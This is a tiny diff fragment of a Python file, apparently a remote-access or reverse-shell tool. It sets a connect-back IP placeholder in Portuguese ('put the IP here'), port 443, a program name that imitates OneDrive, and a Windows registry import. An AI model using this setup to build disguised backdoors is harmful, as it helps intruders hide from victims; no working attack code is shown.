@@ -15,7 +15,7 @@ IS_WINDOWS = os.name == "nt"
 if IS_WINDOWS:
     import winreg
 
-IP = "127.0.0.1"
+IP = "coloque o ip aqui"
 PORT = 443
 
 PROGRAM_NAME = "OneDrive"
